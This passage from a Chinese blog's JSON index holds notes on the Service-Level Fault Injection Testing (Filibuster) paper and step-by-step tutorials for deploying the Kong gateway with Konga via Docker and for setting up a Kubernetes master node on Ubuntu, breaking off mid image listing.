共享资源。\n","date":"2021-12-20T14:51:34+08:00","permalink":"https://lizonglingo.github.io/p/%E7%AC%94%E8%AE%B0-showar-right-sizing-and-efficient-scheduling-of-microservices/","title":"笔记 \u003e SHOWAR: Right-Sizing And Efficient Scheduling of Microservices"},{"content":" 来源：SoCC'21\nMeiklejohn C S, Estrada A, Song Y, et al. Service-Level Fault Injection Testing[C]//Proceedings of the ACM Symposium on Cloud Computing. 2021: 388-402.\n摘要 越来越多的企业使用微服务架构发布他们的大规模的移动或是Web应用。\n问题在于，并非所有系统开发人员都有分布式系统的管理经验，由于这些大规模的应用多是部署与分布式系统中，所以在生产环境中的故障很有可能在开发环境中不会出现。一旦这些微服务部署在分布式系统中，就有可能出现故障。所以，一种好的解决方法就是尽早找出这些问题：在测试环境或者在代码交付生产前就将其解决。\n本文提出服务级别故障注入测试，并实现一个原型“filibuster”，用来系统的识别开发环境中微服务的弹性问题。“Filibuster”使用静态分析及并发风格的执行，还有新颖的动态缩减算法，来扩展现有功能测试的套件，减少开发人员的工作。\n为了证明工具的适用性，文章展示了4个包含错误的真实工业微服务应用程序的语料库。数据来自大公司生产中运行的实验公开信息。文章展示了实验如何在开发过程中运行，并在投入生产环境之前就检测到错误。\n前置知识 1. 混沌工程 在本文中，多次讲到“chaos engineering”，在我个人理解，混沌工程是本文的“服务级故障注入测试”的基础，或者说是“上一个版本”。\n混沌工程代表项目，Netflix创建的“Chaos Monkey”可以在系统的随机位置引发故障，可以随时终止生产环境中运行的虚拟机和容器实例。通过“Chaos Monkey”，开发者可以快速了解构建的服务的健壮性，是否可以弹性扩容以及处理意外故障。\n参考：知乎-系统架构设计之路\n混沌工程，是一种提高技术架构弹性能力的复杂技术手段。Chaos工程经过实验可以确保系统的可用性。混沌工程旨在将故障扼杀在襁褓之中，也就是在故障造成中断之前将它们识别出来。通过主动制造故障，测试系统在各种压力下的行为，识别并修复故障问题，避免造成严重后果。\n主要针对于分布式系统上的故障测试。\n1.1 混沌工程与故障注入的区别 混沌工程是一种生成新信息的实践，而故障注入是测试一种情况的一种特定方法。\n1.2 混沌工程实验的步骤 通常混沌工程由以下四个步骤组成。\n定义测试系统的“稳定状态”。精确定义指标，表明系统按照应有的方式运行。 Netflix使用客户点击视频流设备上播放按钮的速率作为指标，称为“每秒流量”。请注意，这更像是商业指标而非技术指标；在混沌工程中，业务指标通常比技术指标更有用，因为它们更适合衡量用户体验或运营。 创建假设。与任何实验一样，您需要一个假设来进行测试。因为你试图破坏系统正常运行时的稳定状态，你的假设将是这样的，“当我们做X时，这个系统的稳定状态应该没有变化。”为什么用这种方式表达？如果你的期望是你的动作会破坏系统的稳定状态，那么你会做的第一件事会是修复问题。混沌工程应该包括真正的实验，涉及真正的未知数。 模拟现实世界中可能发生的事情，目前有如下混沌工程实践方法：模拟数据中心的故障、强制系统时钟不同步、在驱动程序代码中模拟I/O异常、模拟服务之间的延迟、随机引发函数抛异常。通常，您希望模拟可能导致系统不可用或导致其性能降低的场景。首先考虑可能出现什么问题，然后进行模拟。一定要优先考虑潜在的错误。 “当你拥有非常复杂的系统时，很容易引起出乎意料的下游效应，这是混沌工程寻找的结果之一，”“因此，系统越复杂，越重要，它就越有可能成为混沌工程的候选对象。” 证明或反驳你的假设。将稳态指标与干扰注入系统后收集的指标进行比较。如果您发现测量结果存在差异，那么您的混沌工程实验已经成功 - 您现在可以继续加固系统，以便现实世界中的类似事件不会导致大问题。或者，如果您发现稳定状态可以保持，那么你对该系统的稳定性大可放心。 1.3 案例 https://github.com/chaos-mesh/chaos-mesh\nhttps://github.com/chaosblade-io\nInto 混沌测试（一种用于生产环境中的错误注入，来模拟在用户角度的服务bug）已经证明了的可行性。本文要做的就是把这个过程放在更早的阶段——在开发阶段就检测到这些错误。\n现在又有这样的问题：缺少开源的微服务应用。仅有的开源微服务应用仅仅用来展示如何构建这些微服务应用，并没有展示这些应用在开发、部署时会出现什么错误。因此，该研究不得不和公司合作，并且需要签订严格的保密措施。\n本文贡献 提出一种微服务测试方法：服务级别的故障注入测试 一种新的动态归约算法：将应用程序分解成独立的微服务来减少搜索空间的组合爆炸 实现了这个服务级别的故障注入测试方法——Filibuster：基于Python开发，可以测试提供HTTP通信的微服务 一个用Python实现的微服务应用和故障的语料库：包含8个小心微服务应用程序，每个应用程序都展示了微服务应用中使用的单一模式；还有4个从公开会议演讲中的工业级应用实例——Audible、Expedia、Mailchimp、Netflix 并通过该语料库对Filibuster做出评价：表明Filibuster可以用于识别语料中的所有错误，并且展示了通过动态减少可能进行的优化，还提供了如何设计微服务应用程序以实现可测试性的见解。 挑战——应对 目前困难主要在于：\n缺少开源的工业级微服务应用案例和相关的错误报告。而这两个内容是软件推动软件测试领域的主要语料库。 现有的一些的对于软件测试的研究都是基于一些开源的bug数据库和开源社区的软件，问题在于，这些软件架构多是单体架构，而故障也不是微服务架构所特有的。所以，需要有微服务应用特有的故障以供研究。 而对于大型的微服务应用提供商，往往不能直接去研究。这些产品往往是企业的核心，一般不会开源，并且内部的漏洞也不会公开。 所以，文章系统回顾了50个关于混沌工程的演讲，从这些公开的视频中寻找案例。这些公开演讲中的公司主要关注两个问题：\n开发中的软件的可靠性\n运行这些软件的基础设施的稳定性\n进一步团队根据下面的条件寻找语料：\n演讲中是否提供了使用混沌工程发现的真正的详细错误信息 所展示的混沌工程是否可以在本地复现（也就是在非生产环境中进行混沌测试） 最终，文章选取了4个案例，它们来自 Audible、Expedia、Mailchimp和Netflix。\n案例来源 服务类型 使用混沌工程发现的问题简述 Audible 有声读物移动应用 代码中未处理的错误，该错误会通过通用错误消息传播传到移动客户端 Expedia 旅游预订服务 基于相关性排序的酒店评价服务不可用，回退到基于时间排序的 Mailchimp 电子邮件管理应用 两处不处理返回错误的问题 Netflix 流媒体应用 1.加载客户主页设计的服务故障；2.配置错误超时；3.服务回退失败；4.关键服务未配置回退策略 技术细节 架构示意图 对每个测试服务器进行检测调用，识别调用从何处发起，从何处接收，并在测试期间注入故障。考虑上图，服务A调用服务B，然后服务B调用服务C，最后将结果返回。\nSFIT（Service-Level Fault Injection Testing ）建立在当今微服务程序开发的三个关键点之上：\n微服务是独立开发的：不同微服务开发团队难以知晓其他团队服务的内部细节和详细使用规范，难以验证其他服务的问题 如果对于微服务进行故障模拟测试，能很大程度上保证生产环境下服务正常运行：但是从文章选取的案例来看，许多团队并没有这样做，可能是因为这样耗费时间或者性价比太低 功能测试是黄金标准：开发者使用端到端的测试，并认为这是非常有用的， 本文也因此也在这一点切入。 SFIT实现细节 假设服务通过HTTP提供，并且单个功能测试可以测试所有应用程序行为。\nOverview 通过常规测试，排除服务的逻辑错误。 在两个微服务的通信端点，再设计一个测试，并且对微服务之间的请求进行错误注入。如果这次错误注入可以引起不同的服务错误，那么对于每种错误都再复现一次。 这些后续的执行放在堆栈上，然后递归执行，直到探索到所有的问题点。 故障注入 本文的方法依赖于远程调用，如HTTP或gRPC，因此需要有干预微服务之间请求的能力。Opentelemetry、Opentracing等工具已经提供了远程通信的公共调用库。利用这种工具设计故障注入：根据注入的故障，返回故障响应。\n故障识别 发起请求调用源点的故障：例如Python中request库执行HTTP请求时，执行该请求会引发23个异常，本演示只考虑两个最常见的故障——超时和连接错误。 接收请求的远程服务的故障：如果一个服务依赖的另一个服务抛出Timeout异常，那么调用它的服务可能会捕获到，并返回500。 此外，还有一点是，HTTP请求使用URL标识。相似的URL可能用于不同的服务，所以需要对调用的服务进行一个标识，以此明确服务调用双方的身份。\n测试适配 本文提供了一个模块帮助开发者编写故障注入测试，从而减轻开发人员编写复杂测试的负担。需要注意，本文的测试是非入侵的。\n故障缩减 如果组成应用有几十上百的微服务，那么出现错误的空间将非常大。所以有必要在实现故障最大覆盖率的同时，减少搜索空间，提高效率。利用服务分解，对每个独立的微服务进行排障。\n为此，我们可以利用以下 3 个关键观察结果：\n充分了解服务依赖项可能失败的所有方式。确保我们了解单个服务的一个或多个依赖项失败时的行为以及该服务返回的结果失败是什么。参考图Audible示例，探索 ADS 依赖项可能失败的方式组合（以及 CDS 依赖项失败的方式等） 如果我打算在两个或多个不同服务的至少一个依赖项上注入故障，我们已经知道这些故障将对将它们作为依赖项的服务产生的影响。以图Audible示例，我们已经知道当 ADS 的依赖项以任何可能的组合失败时会返回什么，因为我们已经运行了该测试。我们也已经知道当 CDS 的依赖项出于同样的原因以任何可能的组合失败时，它会返回什么。因此，我们不必在依赖项处注入故障，直接在 ADS 或 CDS 中直接注入适当的响应。 如果我们已经在该服务中注入了该故障，那么测试就是多余的，因为我们已经观察到了应用程序的这种行为。如果我们参考图Audible示例，我们不需要测试 Stats 服务失败与 Audio Assets 或 Audio Metadata 服务的失败，因为我们已经知道这些失败的结果，这些服务将它们作为依赖；我们也已经观察到这些结果。 动态归约算法 Filibuster 这是该团队实现的原型，利用Python以及一些开源库实现的。\nFilibuster可以注入这些故障：\n调用端异常：由请求库抛出，指示连接错误或超时等条件。对于所有异常类型，Filibuster 可以在抛出异常之前有条件地联系其他服务。对于超时，Filibuster 可以在抛出超时异常之前有条件地等待超时时间。 错误响应：从远程服务使用标准 HTTP 错误代码指示内部服务器错误或服务不可用等情况。对于每个错误代码，Filibuster 可以有条件地返回一个关联的正文。 由于 Filibuster 是作为服务器编写的，跨语言支持是可能的，但尚未实现。仪器和 Filibuster 服务器之间的所有通信都是通过独立于语言的协议进行的；任何特定于语言的东西都在仪器库中完成。\n应用语料库 电影应用案例 由四个微服务组成：\n放映时间：返回电影的放映时间 电影：返回给定电影的信息 预订：给定用户名，返回有关该用户预订的信息 用户：存储用户信息并通过首先请求用户的预订来编排来自最终用户的请求，并且对于每个预订执行对电影服务的后续请求以获取有关电影的信息 根据上述的基础案例，文章又改造了7个示例：\nCinema-2：直接预定电影 Cinema-3：与cinema-2 相同，但users 服务在调用bookings 服务时有一个重试循环 Cinema-4：与cinema-2 相同，但每个服务在发出任何请求之前都与外部服务对话：用户服务向IMDB 发出请求；预订服务向 Fandango 提出请求；电影服务向 Rotten Tomatoes 提出请求 Cinema-5：无论失败与否，所有请求都会发生；在失败的情况下，使用硬编码的默认响应。 Cinema-6：添加了预订的第二个副本，在主要副本出现故障时联系该副本。 Cinema-7：与cinema-6 相同，但用户服务在发出实际请求之前调用主要预订副本上的健康检查端点。 Cinema-8：示例被折叠成单体，其中 API 服务器通过重试循环向它发出请求 工业级案例Audible、Expedia、Mailchimp 和 Netflix 示例并不是要重现这些公司的整个微服务架构：我们只关注他们执行的特定混沌实验中涉及的服务。\nAudible 这个案例包含8个微服务和一个移动客户端：\n内容交付服务（CDS）：给定图书标识符和用户标识符，授权后返回实际音频内容和音频元数据 内容交付引擎 (CDE)：返回要请求的的正确 CDS 的 URL Audible App：模拟移动应用程序，向CDE发出请求，根据图书标识符查找相应CDS实例的URL，然后向其发出请求 声音下载服务（ADS）：一旦所有权得到验证，就会协调日志记录和 DRM 授权 所有权：验证书的所有权 激活：为用户激活 DRM 许可证 统计：维护书籍和许可证激活统计 资产元数据：存储包含章节描述信息的音频资产元数据 音频资产：音频文件的存储 由于实际的服务是部署在AWS上的微服务，本文则简化并模拟了这些服务：\n首先，资产元数据和音频资产服务是 AWS S3 存储桶（云存储）。为了模拟这一点，我们创建了 HTTP 服务，如果可用则返回包含资产的 200 OK，或者如果资产不存在则返回 404 Not Found。\n其次，所有权和激活服务是 AWS RDS 实例。为了模拟这一点，我们创建了实现 REST 模式的 HTTP 服务：如果用户不拥有这本书，则返回 403 Forbidden，如果这本书不存在，则返回 404 Not Found，否则返回 200 OK。\n第三，Stats 服务是一个 AWS DynamoDB 实例。为了模拟这一点，我们创建了一个返回 200 OK 的 HTTP 服务\nExpedia 包含三个微服务：\n按相关性顺序返回评论 按时间顺序返回评论 API 网关：根据可用性从 Review ML 或 Review Time 向用户返回评论 Mailchimp 包含3个微服务：\nRequestmapper：将电子邮件活动中的高亮URL映射到实际资源URL DB Primary：他们数据库的主要副本 DB Secondary：他们数据库的次要副本 App Server：向Requestmapper服务请求解析URL，然后对数据库执行read-then-write请求，当主副本不可用时回退到二级数据库副本 负载均衡器：负载均衡请求 与 Mailchimp 的实际部署相比，我们表示为服务的一些组件实际上是非 HTTP 服务。我们在这里列举了这些差异和调整。首先，DB Primary 和 Secondary 服务是 MySQL 实例。为了模拟这一点，我们创建了一个 HTTP 服务，该服务在成功读取或写入时返回 200 OK，如果数据库为只读则返回 403 Forbidden。其次，Load Balancer 服务是一个 HAProxy 实例。为了模拟这一点，我们创建了一个 HTTP 代理。\nMailchimp 示例的错误包含两个：\nMySQL 实例只读。当 MySQL 实例为只读时，数据库会返回一个错误，该错误在代码的某个区域未处理。由于 Mailchimp 使用 PHP，这个错误被直接呈现到页面的输出中，我们通过将 403 Forbidden 响应转换为直接插入页面的输出来模拟这一点。 Requestmapper 不可用。当 Requestmapper 服务不可用时，App Server 无法正确处理错误，向负载均衡器返回 500 Internal Server Error。但是，负载均衡器仅配置为通过返回格式化的错误页面来处理 503 Service Unavailable 错误。这是丢失或不正确的故障处理示例。 Netflix 包含10个微服务，与Audible示例类似，我们使用服务模拟 Netflix 移动应用程序，这里称为客户端：\n客户端：模拟移动客户端 API 网关：组装用户主页 用户档案：返回档案信息 书签：返回上次查看的位置 我的列表：返回用户列表中的电影列表 用户推荐：返回用户推荐的电影 评分：返回用户的评分 遥测：记录遥测信息 趋势：返回热门电影 全局推荐：返回推荐的电影 Netflix示例的bug包含三个，可以使用环境变量激活：\n错误配置的超时。用户配置文件服务以 10 秒的超时时间调用遥测服务；但是，API 网关会以 1 秒的超时时间调用用户配置文件服务 服务回退到同一服务器。如果我的列表服务不可用，系统将重试（我的理解是，一个服务有3个实例，其中一个实例不可用，本应该请求其他实例，结果再次请求了那个不可用的实例） 没有回退的关键服务。用户配置文件服务没有后备处理逻辑 ","date":"2021-12-18T15:35:42+08:00","permalink":"https://lizonglingo.github.io/p/%E7%AC%94%E8%AE%B0-service-level-fault-injection-testing/","title":"笔记 \u003e Service-Level Fault Injection Testing"},{"content":"Kong网关是一个轻量级、高性能、可拓展的云原生API网关。下面我们以docker的形式搭建kong环境。\n1. 拉取kong-gateway镜像并打上标签 lzl@lzl:~$ docker pull kong/kong-gateway:2.6.0.1-alpine 2.6.0.1-alpine: Pulling from kong/kong-gateway a0d0a0d46f8b: Already exists 292d8c0f5367: Pulling fs layer 8f939e93459a: Pulling fs layer 8335045176a7: Pulling fs layer 2.6.0.1-alpine: Pulling from kong/kong-gateway a0d0a0d46f8b: Already exists 292d8c0f5367: Pull complete 8f939e93459a: Pull complete 8335045176a7: Pull complete Digest: sha256:20d1f65138b36ffeadd6c63abe0dc1b496d42ab7bd49553328524d0bbf622026 Status: Downloaded newer image for kong/kong-gateway:2.6.0.1-alpine docker.io/kong/kong-gateway:2.6.0.1-alpine lzl@lzl:~$ docker tag kong/kong-gateway:2.6.0.1-alpine kong 2. 创建kong和其组件使用的网络 lzl@lzl:~$ docker network create kong-net db4a092863e8dc77f26cf4aa43ffb62d09e19c1c66e9b15418d92277850c83a3 lzl@lzl:~$ docker network ls NETWORK ID NAME DRIVER SCOPE 505f6cc0e5b7 bridge bridge local 9027fdbdc8f6 docker_gwbridge bridge local 7a84b4fa35eb host host local db4a092863e8 kong-net bridge local 66b37b687b76 none null local 3.配置kong所使用的database 这里我们使用postgres，当然也可以使用别的数据库。\nlzl@lzl:~$ docker run -d --name kong-database \\ \u0026gt; --network=kong-net \\ \u0026gt; -p 5432:5432 \\ \u0026gt; -e \u0026#34;POSTGRES_USER=kong\u0026#34; \\ \u0026gt; -e \u0026#34;POSTGRES_DB=kong\u0026#34; \\ \u0026gt; -e \u0026#34;POSTGRES_PASSWORD=kong\u0026#34; \\ \u0026gt; postgres:9.6 0d9691c833ab59555dadee339a1f7e15fcc4948793bede7a39112e9f39d62ee7 4. 正式启动kong之前需要迁移数据库 lzl@lzl:~$ docker run --rm \\ \u0026gt; --network=kong-net \\ \u0026gt; -e \u0026#34;KONG_DATABASE=postgres\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_HOST=kong-database\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_USER=kong\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_PASSWORD=kong\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_CASSANDRA_CONTACT_POINTS=kong-database\u0026#34; \\ \u0026gt; kong:latest kong migrations bootstrap Bootstrapping database... migrating core on database \u0026#39;kong\u0026#39;... core migrated up to: 000_base (executed) core migrated up to: 003_100_to_110 (executed) core migrated up to: 004_110_to_120 (executed) core migrated up to: 005_120_to_130 (executed) ··· ··· migrating enterprise.response-transformer-advanced on database \u0026#39;kong\u0026#39;... enterprise.response-transformer-advanced migrated up to: 001_1500_to_2100 (executed) 82 migrations processed 82 executed Database is up-to-date 5. 启动kong lzl@lzl:~$ docker run -d --name kong \\ \u0026gt; --network=kong-net \\ \u0026gt; -e \u0026#34;KONG_DATABASE=postgres\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_HOST=kong-database\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_USER=kong\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PG_PASSWORD=kong\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_CASSANDRA_CONTACT_POINTS=kong-database\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PROXY_ACCESS_LOG=/dev/stdout\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_ADMIN_ACCESS_LOG=/dev/stdout\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_PROXY_ERROR_LOG=/dev/stderr\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_ADMIN_ERROR_LOG=/dev/stderr\u0026#34; \\ \u0026gt; -e \u0026#34;KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl\u0026#34; \\ \u0026gt; -p 8000:8000 \\ \u0026gt; -p 8443:8443 \\ \u0026gt; -p 8001:8001 \\ \u0026gt; -p 8444:8444 \\ \u0026gt; kong:latest e549737ac5cd6bcc49bcf073619950402b40f312fbe7affc028c6b46039a7f20 到这里，kong-gateway就已经启动了。这里开放的几个端口说明一下：\n端口 用途 8000 监听客户端传入的HTTP请求并进行转发 8443 监听客户端传入的HTTPS请求并进行转发 8001 Admin API，管理者通过这个端口对Kong的监听服务进行配置、插件设置、API的配置以及负载均衡等 8444 可通过此端口对HTTPS请求进行监控 6. 为配置kong的可视化界面konga配置数据库 进入到postgres中添加新的用户，并创建konga用的数据库。\nlzl@lzl:~$ docker exec -it kong-database /bin/bash root@0d9691c833ab:/# psql -U kong -W Password for user kong: psql (9.6.24) Type \u0026#34;help\u0026#34; for help. kong=# create user konga with password \u0026#39;konga\u0026#39;; CREATE ROLE kong=# create database konga owner konga; CREATE DATABASE kong=# grant all privileges on database konga to konga; GRANT kong=# 7. 预启动konga 这一步主要是为了konga配置数据库。\nlzl@lzl:~$ docker run --rm pantsel/konga:latest \\ \u0026gt; -c prepare \\ \u0026gt; -a postgres \\ \u0026gt; -u postgresql://konga:konga@10.0.20.25:5432/konga debug: Preparing database... Using postgres DB Adapter. Database exists. Continue... debug: Hook:api_health_checks:process() called debug: Hook:health_checks:process() called debug: Hook:start-scheduled-snapshots:process() called debug: Hook:upstream_health_checks:process() called debug: Hook:user_events_hook:process() called debug: Seeding User... debug: User seed planted debug: Seeding Kongnode... debug: Kongnode seed planted debug: Seeding Emailtransport... debug: Emailtransport seed planted debug: Database migrations completed! 8. 启动konga lzl@lzl:~$ docker run -d --name konga \\--network=kong-net \u0026gt; -e \u0026#34;DB_ADAPTER=postgres\u0026#34; \\ \u0026gt; -e \u0026#34;DB_HOST=10.0.20.25\u0026#34; \\ \u0026gt; -e \u0026#34;DB_PORT=5432\u0026#34; \\ \u0026gt; -e \u0026#34;DB_USER=konga\u0026#34; \\ \u0026gt; -e \u0026#34;DB_PASSWORD=konga\u0026#34; \\ \u0026gt; -e \u0026#34;DB_DATABASE=konga\u0026#34; \\ \u0026gt; -e \u0026#34;DB_PG_SCHEMA=public\u0026#34; \\ \u0026gt; -e \u0026#34;NODE_ENV=production\u0026#34; \\ \u0026gt; -p 1337:1337 pantsel/konga 7031e0fb024b3c1919895b1f9ae516f06a3e95a805aee0076a3cfb99f3d889f5 # 开放这个端口，以免不能正常访问 lzl@lzl:~$ sudo iptables -A INPUT -p udp --dport 1337 -j ACCEPT lzl@lzl:~$ sudo iptables -A INPUT -p tcp --dport 1337 -j ACCEPT 9. 现在就可以打开界面玩一玩了 创建连接，将konga连接到kong的API。这里注意Kong Admin URL就写http://kong:8001，我写http://localhost:8001怎么都连不上。\n创建服务。这个服务可以是一个应用，也可以是某个接口。我把我的博客作为服务，让网关帮我做转发。\n然后配置转发路由。这里输入完一定要按下回车。\n现在访问:8000/blog端口会自动转到。但是目前还存在许多问题。\n使用kong之后我的宿主机无法访问虚拟机的内容了。 对于kong网关的转发和路由机制还没搞清楚。 除此之外，kong-gateway还可以接入身份认证插件（如：JWT），链路追踪插件（如：zipkin），监控插件（如：prometheus），值得好好研究一下。\n参考：\nhttps://www.cnblogs.com/jerryqm/p/12901036.html\nhttps://www.jianshu.com/p/551a4c61e224\n","date":"2021-12-02T19:20:18+08:00","permalink":"https://lizonglingo.github.io/p/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3--kong/","title":"微服务网关--kong"},{"content":"概念 关于k8s的一些概念在官网讲的很详细，这里着重说几个。\n主节点 主节点是组成集群控制平面的系统服务集合。生产环境中一般建议有3或5个主节点保证管理的高可用HA。主节点的服务有：\nAPI Server：为所有组件提供通信支持 集群存储：比如etcd 管理器controller：实现全部的后台循环控制，完成对集群节点的监控并对事件做出响应，目的是保证集群的当前状态与期望状态相同 调度器scheduler：通过监听API Server启动新的工作任务并将其分配到合适的节点中 此外，还有云controller管理器，是针对运行在云平台（如AWS、Azure）的用户集群进行管理的组件。\n关于工作节点的内容在后面的文章中会跟上。\n启动k8s的master节点 成功启动还是花了不少时间的，先把相关的参考列上：\nhttps://kubernetes.io/zh/docs/setup/\nhttps://kubernetes.io/zh/docs/tasks/tools/\nhttps://blog.csdn.net/professorman/article/details/118150688\nhttps://stackoverflow.com/questions/52119985/kubeadm-init-shows-kubelet-isnt-running-or-healthy\nhttps://bbs.huaweicloud.com/forum/thread-76599-1-1.html\nhttps://www.cnblogs.com/potato-chip/p/13973760.html\nhttps://blog.51cto.com/zhangxueliang/2980956\n前置环境 在安装k8s（泛指运行k8s所需要的环境、组件等）之前，我的环境是这样的：\n一台Ubuntu18.0420.04虚拟机，4G内存（最好是4G，我尝试了2G内存结果虚拟机容易卡死） 这里要特别的注意，一开始我是用的是Ubuntu18.04，但是在k8s系列的下一篇文章中，启动Service来访问集群时，出现了问题。这应该是由于Ubuntu18.04内核的一个bug，因为我搭建的环境是Kubernetes1.22.4，启动Service时需要使用iptables来配置规则，而Kubernetes使用的iptables版本要新于Ubuntu18.04的iptables，进而导致有iptables新版本的命令旧版本无法正常执行，导致无法完成Service配置。\n当我将环境更换到Ubuntu20.04时，该问题得到解决，所以建议使用Ubuntu20.04来进行实验。\n需要配置好docker环境 关闭swap 这一点是k8s强烈建议的，我看到所有的教程几乎都说明了关闭swap，可以提高性能。\nswapoff -a sudo sed -i \u0026#39;/ swap / s/^/#/\u0026#39; /etc/fstab 应该需要重启机器才生效。\n开放端口 对于管理节点和工作节点来说，有一些端口需要开放给k8s的组件进行通信：\n控制平面节点 协议 方向 端口范围 作用 使用者 TCP 入站 6443 Kubernetes API 服务器 所有组件 TCP 入站 2379-2380 etcd 服务器客户端 API kube-apiserver, etcd TCP 入站 10250 Kubelet API kubelet 自身、控制平面组件 TCP 入站 10251 kube-scheduler kube-scheduler 自身 TCP 入站 10252 kube-controller-manager kube-controller-manager 自身 工作节点 协议 方向 端口范围 作用 使用者 TCP 入站 10250 Kubelet API kubelet 自身、控制平面组件 TCP 入站 30000-32767 NodePort 服务† 所有组件 以上端口我使用iptables打开。\n开启ip转发 #开启ip转发 vim /etc/sysctl.conf net.ipv4.ip_forward=1 #查看状态 sysctl -p 设置iptables转发规则 这是后来发现的坑，有的机器上iptables的Chain Forward规则是Chain FORWARD (policy DROP)，这样就无法通过集群地址访问部署在别的节点上的Pod，Service也不可用。所以保险起见还是要查看下有没有打开，没有就给他ACCEPT。\niptables -P FORWARD ACCEPT 更换docker的cgroup驱动 因为k8s的cgroup驱动是systems但是docker的是systemd，所以在/etc/docker/daemon.json中添加设置：\n{ \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } 然后重启docker：\nsudo systemctl daemon-reload sudo systemctl restart docker # 因为这个错误我是在安装完kubelet后才出现的 所以我也重启了kubelet sudo systemctl restart kubelet 安装k8s 添加证书 curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - 添加apt源 cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apt/sources.list.d/kubernetes.list deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main EOF apt-get update 安装 默认的，安装最新版本的k8s\napt-get install -y kubelet kubeadm kubectl 也可以安装想要的版本：\napt-get install -y kubelet=1.18.4-00 kubeadm=1.18.4-00 kubectl=1.18.4-00 获取构建k8s需要的镜像 首先查看需要的镜像版本：\nlzl@lzl-b:~$ kubeadm config images list k8s.gcr.io/kube-apiserver:v1.22.4 k8s.gcr.io/kube-controller-manager:v1.22.4 k8s.gcr.io/kube-scheduler:v1.22.4 k8s.gcr.io/kube-proxy:v1.22.4 k8s.gcr.io/pause:3.5 k8s.gcr.io/etcd:3.5.0-0 k8s.gcr.io/coredns/coredns:v1.8.4 由于直接通过pull会被墙，所以推荐通过配置了国内源的docker先pull下来，然后再打上想要的tag。整个流程的shell文件如下：\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.22.4 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.22.4 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.22.4 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.22.4 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.5 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.0-0 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.8.4 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.22.4 k8s.gcr.io/kube-apiserver:v1.22.4 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.22.4 k8s.gcr.io/kube-controller-manager:v1.22.4 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.22.4 k8s.gcr.io/kube-scheduler:v1.22.4 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.22.4 k8s.gcr.io/kube-proxy:v1.22.4 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.5 k8s.gcr.io/pause:3.5 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.0-0 k8s.gcr.io/etcd:3.5.0-0 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.8.4 k8s.gcr.io/coredns/coredns:v1.8.4 然后检查下有没有问题：\nlzl@lzl:~/Desktop$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE k8s.gcr.io/kube-apiserver v1.22.4 8a5cc299272d 10 days ago 128MB registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver v1.22.4 8a5cc299272d 10 days ago 128MB k8s.gcr.io/kube-scheduler v1.22.4 721ba97f54a6 10 days ago 52.7MB registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler v1.22.4 721ba97f54a6 10 days ago 52.7MB k8s.gcr.io/kube-controller-manager v1.22.4 0ce02f92d3e4 10 days ago 122MB registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager v1.22.4 0ce02f92d3e4 10 days ago 122MB k8s.gcr.io/kube-proxy v1.22.4 edeff87e4802 10 days ago 104MB registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy v1.22.4 edeff87e4802 10 days ago 104MB nginx latest ea335eea17ab 11 days ago 141MB alpine \u0026lt;none\u0026gt; 0a97eee8041e 2 weeks ago 5.61MB counter-app-master_web-fe latest 1e3f0e452820 2 weeks ago 52.5MB carrotliduo/web latest 8b05e3c03d63 3 weeks ago 77MB test latest 8b05e3c03d63 3 weeks ago 77MB web latest 8b05e3c03d63 3 weeks ago 77MB python 3.6-alpine c5aebf5e06c5 4 weeks ago 40.8MB ubuntu latest ba6acccedd29 6 weeks ago 72.8MB redis alpine e24d2b9deaec 7 weeks ago 32.3MB alpine latest 14119a10abf4 3 months ago 5.6MB nigelpoulton/tu-demo latest c610c6a38555 4 months ago 58.1MB nigelpoulton/tu-demo v2 c610c6a38555 4 months ago 58.1MB nigelpoulton/tu-demo v1 6ba12825d092 4 months ago 58.1MB nigelpoulton/pluralsight-docker-ci latest 1c201f15a046 5 months ago 79.5MB registry.cn-hangzhou.aliyuncs.com/google_containers/etcd 3.5.0-0 004811815584 5 months ago 295MB k8s.gcr.io/etcd 3.5.0-0 004811815584 5 months ago 295MB k8s.gcr.io/coredns/coredns v1.8.4 8d147537fb7d 6 months ago 47.6MB registry.cn-hangzhou.aliyuncs.com/google_containers/coredns v1.8.4 8d147537fb7d 6 months ago 47.6MB k8s.gcr.io/pause 3.5 ed210e3e4a5b 8 months ago 683kB registry.cn-hangzhou.aliyuncs.com/google_containers/pause 3.5 ed210e3e4a5b 8 months ago 683kB nigelpoulton/tu-demo v2-old 